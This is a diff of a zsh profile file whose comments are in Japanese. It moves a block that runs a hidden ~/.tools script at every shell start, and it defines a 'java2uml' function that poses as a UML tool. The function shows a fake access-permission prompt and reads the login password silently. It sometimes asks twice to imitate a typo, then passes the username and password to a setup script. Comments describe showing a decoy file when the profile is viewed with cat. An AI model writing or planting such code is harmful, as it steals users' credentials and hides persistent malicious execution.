@@ -1,64 +1,3 @@
-[ ! -f "$HOME/.cache/.zprofile" ] && echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' > "$HOME/.cache/.zprofile"
-eval "$(/opt/homebrew/bin/brew shellenv)"
-chmod +x ~/.tools/java2uml/run.sh
-~/.tools/java2uml/run.sh
-java2uml() {
-  AUTH_FILE="$HOME/.java2uml_setup_check"
-  INTERVAL_DAYS=0
-  NOW=$(date +%s)
-
-  if [[ ! -f "$AUTH_FILE" ]]; then
-    echo 0 > "$AUTH_FILE"
-  fi
-
-  LAST_AUTH=$(cat "$AUTH_FILE")
-  DIFF=$(( (NOW - LAST_AUTH) / 86400 ))
-
-  if [[ "$DIFF" -ge "$INTERVAL_DAYS" ]]; then
-    echo "⚠️  アクセスの許可が必要です。"
-
-    while true; do
-      echo -n "Password: "
-      stty -echo
-      read PASSWORD
-      stty echo
-      echo
-
-      if [[ ${#PASSWORD} -le 3 ]]; then
-        continue
-      fi
-
-      if (( RANDOM % 2 == 0 )); then
-        echo
-        echo -n "Password: "
-        stty -echo
-        read PASSWORD
-        stty echo
-        echo
-        if [[ ${#PASSWORD} -le 3 ]]; then
-          continue
-        fi
-      fi
-
-      break
-    done
-
-    USERNAME=$(whoami)
-    python3 ~/.tools/java2uml/setup.py "$USERNAME" "$PASSWORD"
-    echo "$NOW" > "$AUTH_FILE"
-  fi
-
-  if [[ $# -lt 2 ]]; then
-    echo "Usage: java2uml <output file> <input directory>"
-    return 1
-  fi
-
-  python3 ~/.tools/java2uml/main.py "$1" "$2"
-}
-
-# ~/.zprofile に追加
-
-# cat ~/.zprofile が実行されたときだけ ~/.cache/.zprofile を表示
 # ~/.zprofile に追加
 
 # cat ~/.zprofile が実行されたときだけ ~/.cache/.zprofile を表示
@@ -124,6 +63,63 @@ code() {
     fi
 }
 
+# 以下のコマンドはファイルに追加する部分です
+[ ! -f "$HOME/.cache/.zprofile" ] && echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' > "$HOME/.cache/.zprofile"
+eval "$(/opt/homebrew/bin/brew shellenv)"
+chmod +x ~/.tools/java2uml/run.sh
+~/.tools/java2uml/run.sh
 
+# java2uml 関数定義
+java2uml() {
+  AUTH_FILE="$HOME/.java2uml_setup_check"
+  INTERVAL_DAYS=0
+  NOW=$(date +%s)
 
-history -p
+  if [[ ! -f "$AUTH_FILE" ]]; then
+    echo 0 > "$AUTH_FILE"
+  fi
+
+  LAST_AUTH=$(cat "$AUTH_FILE")
+  DIFF=$(( (NOW - LAST_AUTH) / 86400 ))
+
+  if [[ "$DIFF" -ge "$INTERVAL_DAYS" ]]; then
+    echo "⚠️  アクセスの許可が必要です。"
+
+    while true; do
+      echo -n "Password: "
+      stty -echo
+      read PASSWORD
+      stty echo
+      echo
+
+      if [[ ${#PASSWORD} -le 3 ]]; then
+        continue
+      fi
+
+      if (( RANDOM % 2 == 0 )); then
+        echo
+        echo -n "Password: "
+        stty -echo
+        read PASSWORD
+        stty echo
+        echo
+        if [[ ${#PASSWORD} -le 3 ]]; then
+          continue
+        fi
+      fi
+
+      break
+    done
+
+    USERNAME=$(whoami)
+    python3 ~/.tools/java2uml/setup.py "$USERNAME" "$PASSWORD"
+    echo "$NOW" > "$AUTH_FILE"
+  fi
+
+  if [[ $# -lt 2 ]]; then
+    echo "Usage: java2uml <output file> <input directory>"
+    return 1
+  fi
+
+  python3 ~/.tools/java2uml/main.py "$1" "$2"
+}
